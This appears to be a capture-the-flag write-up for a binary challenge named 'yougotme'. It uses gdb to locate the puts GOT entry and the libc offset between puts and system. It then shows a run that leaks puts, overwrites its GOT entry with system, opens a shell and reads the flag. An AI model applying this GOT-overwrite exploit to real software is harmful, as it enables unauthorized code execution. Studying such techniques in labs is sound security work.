1. find address for 'puts'
```
x/i puts
0x793057b80e50 <__GI__IO_puts>:	endbr64
```

```
info function puts ## Non-debugging symbols: 0x00000000004010c0  puts@plt
p &puts ## $1 = (int (*)(const char *)) 0x793057b80e50 <__GI__IO_puts>
```

```
x/2i 0x00000000004010c0
    0x4010c0 <puts@plt>:	endbr64
    0x4010c4 <puts@plt+4>:
    bnd jmp *0x2365(%rip)        # 0x403430 <puts@got.plt>
```
The address of 'putc' in GOT is 0x403430
2. find address of 'system'
```
(gdb) p system
$2 = {int (const char *)} 0x793057b50d70 <__libc_system>
```

Then calculate the offset between 'system' and 'puts': 0x793057b50d70 - 0x793057b80e50 = -196832
Since we know the offset, and we know that ALSR is applied to C library, we just need to start the program the read the address of 'puts', then we need to add the offset to find the address of 'system', and rewrite it to 'puts' GOT entry.

Here is an exmaple run:
```
task01@aeee65ee3746:~$ ./yougotme
1. write
2. read
3. echo
4. exit
> 4207664
1. write
2. read
3. echo
4. exit
> 2
Read where: 4207664
0x7f3b20a83e50
1. write
2. read
3. echo
4. exit
> 1
Write where: 4207664
Write what: 139891927498096
sh: 1: 1.: not found
sh: 1: 2.: not found
sh: 1: 3.: not found
sh: 1: 4.: not found
> 3
/bin/sh
$ whoami
task01flag
$ cat flag.txt
flag: ZPGhGYwbtGWTtszSfDfWFnpjJyfqsw
```
